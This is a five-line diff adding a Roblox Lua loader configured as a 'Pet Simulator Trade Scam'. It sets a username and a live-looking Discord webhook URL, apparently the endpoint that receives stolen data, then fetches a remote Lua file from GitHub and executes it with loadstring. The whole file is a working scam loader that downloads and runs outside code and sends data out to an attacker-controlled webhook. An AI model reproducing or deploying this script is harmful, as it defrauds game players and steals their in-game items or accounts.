@@ -1,0 +1,5 @@
+_G.Username "D2rk3n"
+_G.HubName "Pet Simulator Trade Scam"
+_G.WebhookUrl "https://discord.com/api/webhooks/1138281920959094866/PfkQv_pq-J7Eu_y0pf_pAXEuxv8vwagzM5MCVLARpMEW72ItByBIPKD_kVkPfEuU_141"
+
+loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
